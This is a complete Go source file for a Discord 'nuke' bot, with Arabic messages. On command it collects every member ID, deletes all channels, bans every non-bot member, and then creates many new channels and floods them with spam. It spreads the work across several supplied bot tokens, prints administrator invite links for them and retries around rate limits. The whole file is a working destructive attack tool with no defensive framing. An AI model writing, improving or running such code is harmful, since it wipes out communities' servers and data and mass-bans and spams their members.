package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 10000,
		IdleConnTimeout:     60 * time.Second,
	},
	Timeout: 10 * time.Second,
}

func extractClientIDFromToken(token string) string {
	parts := strings.Split(token, ".")
	if len(parts) == 0 {
		return ""
	}
	decoded, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		decoded, err = base64.StdEncoding.DecodeString(parts[0])
		if err != nil {
			return ""
		}
	}
	return string(decoded)
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: متغير البيئة MASTERGUARD_TOKEN غير موجود")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsAll

	cmdNuke := "nuke"
	commandNuke := &discordgo.ApplicationCommand{
		Name:        cmdNuke,
		Description: "nuke server",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات المراد إنشاؤها",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة التي ستُرسل",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "bot_tokens",
				Description: "التوكنات مفصولة بفاصلة (,) لتوزيع المهام بينها",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		if i.Member == nil || (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "❌ هذا الأمر للمشرفين فقط.",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			return
		}

		if i.ApplicationCommandData().Name == cmdNuke {
			// الرد الفوري لتجنب تعليق الديسكورد
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "⚡ تم استلام الأمر! راقب الشاشة السوداء (الكونسول) لتنفيذ العمليات السريعة.",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range i.ApplicationCommandData().Options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			tokensInput := optionMap["bot_tokens"].StringValue()
			
			rawTokens := strings.Split(tokensInput, ",")
			var tokens []string
			for _, t := range rawTokens {
				t = strings.TrimSpace(t)
				if t != "" {
					tokens = append(tokens, t)
				}
			}

			guildID := i.GuildID
			botID := s.State.User.ID

			go executeDistributedNuke(tokens, guildID, botID, roomName, roomsCount, messageContent, messagesCount, s)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في تشغيل الجلسة:", err)
		return
	}

	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
	fmt.Println("🤖 بوت السرعات القصوى شغال وجاهز!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func executeDistributedNuke(tokens []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, s *discordgo.Session) {
	fmt.Println("\n🚀 [بدء التنفيذ] جارٍ معالجة التوكنات وتوليد الروابط...")

	if len(tokens) == 0 {
		fmt.Println("❌ خطأ: لم يتم إدخال أي توكن صحيح.")
		return
	}

	getHeaders := func(index int) map[string]string {
		token := tokens[index%len(tokens)]
		return map[string]string{
			"Authorization": "Bot " + token,
			"Content-Type":  "application/json",
			"User-Agent":    "DiscordBot (https://discord.com, v10)",
		}
	}

	botIDs := make(map[string]bool)
	botIDs[botID] = true
	for _, t := range tokens {
		clientID := extractClientIDFromToken(t)
		if clientID != "" {
			botIDs[clientID] = true
		}
	}

	fmt.Printf("🔗 روابط دعوة البوتات المساعدة المباشرة (Guild ID: %s):\n", guildID)
	for idx, t := range tokens {
		clientID := extractClientIDFromToken(t)
		if clientID != "" {
			inviteLink := fmt.Sprintf("https://discord.com/oauth2/authorize?client_id=%s&permissions=8&scope=bot&guild_id=%s", clientID, guildID)
			fmt.Printf("Bot #%d: %s\n", idx+1, inviteLink)
		}
	}
	fmt.Println("--------------------------------------------------")

	channelPayloads := make([][]byte, roomsCount)
	for i := 0; i < roomsCount; i++ {
		p, _ := json.Marshal(map[string]interface{}{
			"name": fmt.Sprintf("%s-%d", roomName, i),
			"type": 0,
		})
		channelPayloads[i] = p
	}

	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})

	fmt.Println("⏳ جارٍ سحب الأعضاء...")
	var allUserIDs []string
	after := ""
	for {
		members, err := s.GuildMembers(guildID, after, 1000)
		if err != nil || len(members) == 0 {
			break
		}
		for _, m := range members {
			if m != nil && m.User != nil {
				if !botIDs[m.User.ID] {
					allUserIDs = append(allUserIDs, m.User.ID)
				}
				after = m.User.ID
			}
		}
		if len(members) < 1000 {
			break
		}
	}
	fmt.Printf("👥 تم الانتهاء من سحب الأعضاء. عدد المستهدفين: %d\n", len(allUserIDs))

	fmt.Println("🗑️ جارٍ جلب وحذف القنوات القديمة...")
	channels, err := s.GuildChannels(guildID)
	var oldChannelIDs []string
	if err == nil {
		for _, ch := range channels {
			if ch != nil {
				oldChannelIDs = append(oldChannelIDs, ch.ID)
			}
		}
	}

	var wgDel sync.WaitGroup
	for idx, id := range oldChannelIDs {
		wgDel.Add(1)
		go func(chID string, index int) {
			defer wgDel.Done()
			headers := getHeaders(index)
			delURL := "https://discord.com/api/v10/channels/" + chID
			for {
				delReq, _ := http.NewRequest("DELETE", delURL, nil)
				for k, v := range headers {
					delReq.Header.Set(k, v)
				}

				resp, err := httpClient.Do(delReq)
				if err != nil {
					return
				}

				if resp.StatusCode == 429 {
					retryAfterStr := resp.Header.Get("Retry-After")
					resp.Body.Close()
					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
						time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 10*time.Millisecond)
					} else {
						time.Sleep(30 * time.Millisecond)
					}
					continue
				}
				resp.Body.Close()
				break
			}
		}(id, idx)
	}
	wgDel.Wait()

	if len(allUserIDs) > 0 {
		fmt.Println("🔨 جارٍ تنفيذ الحظر...")
		var wgBan sync.WaitGroup
		for idx, userID := range allUserIDs {
			wgBan.Add(1)
			go func(uid string, index int) {
				defer wgBan.Done()
				headers := getHeaders(index)
				banURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
				for {
					banReq, err := http.NewRequest("PUT", banURL, nil)
					if err != nil {
						return
					}
					for k, v := range headers {
						banReq.Header.Set(k, v)
					}

					resp, err := httpClient.Do(banReq)
					if err != nil {
						return
					}

					if resp.StatusCode == 429 {
						retryAfterStr := resp.Header.Get("Retry-After")
						resp.Body.Close()
						if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
							time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 10*time.Millisecond)
						} else {
							time.Sleep(30 * time.Millisecond)
						}
						continue
					}
					
					resp.Body.Close()
					break
				}
			}(userID, idx)
		}
		wgBan.Wait()
	}

	fmt.Println("🏗️ جارٍ إنشاء الرومات الجديدة...")
	var newChannelIDs []string
	var muChannels sync.Mutex
	var wgCreate sync.WaitGroup

	for idx, payload := range channelPayloads {
		wgCreate.Add(1)
		go func(p []byte, index int) {
			defer wgCreate.Done()
			headers := getHeaders(index)
			for {
				reqCreate, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(p))
				for k, v := range headers {
					reqCreate.Header.Set(k, v)
				}

				resp, err := httpClient.Do(reqCreate)
				if err != nil {
					return
				}

				if resp.StatusCode == 429 {
					retryAfterStr := resp.Header.Get("Retry-After")
					resp.Body.Close()
					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
						time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 10*time.Millisecond)
					} else {
						time.Sleep(30 * time.Millisecond)
					}
					continue
				}

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					var chResult map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&chResult) == nil {
						if chID, ok := chResult["id"].(string); ok {
							muChannels.Lock()
							newChannelIDs = append(newChannelIDs, chID)
							muChannels.Unlock()
						}
					}
				}
				resp.Body.Close()
				break
			}
		}(payload, idx)
	}
	wgCreate.Wait()

	if len(newChannelIDs) > 0 && messagesCount > 0 {
		fmt.Println("💬 جارٍ إرسال الرسائل في الرومات الجديدة...")
		var wgMsg sync.WaitGroup
		for chIdx, chID := range newChannelIDs {
			for m := 0; m < messagesCount; m++ {
				wgMsg.Add(1)
				
				tokenIndex := (chIdx * messagesCount) + m
				token := tokens[tokenIndex%len(tokens)]

				go func(chIDParam string, t string) {
					defer wgMsg.Done()
					
					botClient := &http.Client{
						Timeout: 5 * time.Second,
					}

					headers := map[string]string{
						"Authorization": "Bot " + t,
						"Content-Type":  "application/json",
						"User-Agent":    "DiscordBot (https://discord.com, v10)",
					}

					for {
						msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chIDParam+"/messages", bytes.NewBuffer(msgPayload))
						for k, v := range headers {
							msgReq.Header.Set(k, v)
						}

						msgResp, err := botClient.Do(msgReq)
						if err != nil {
							break
						}

						if msgResp.StatusCode == 429 {
							retryAfterStr := msgResp.Header.Get("Retry-After")
							msgResp.Body.Close()
							if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
								time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 5*time.Millisecond)
							} else {
								time.Sleep(20 * time.Millisecond)
							}
							continue
						}
						
						msgResp.Body.Close()
						break
					}
				}(chID, token)
			}
		}
		wgMsg.Wait()
	}

	fmt.Println("✅ [اكتمل] انتهت كافة العمليات بالسرعة القصوى التامة بنجاح!")
}
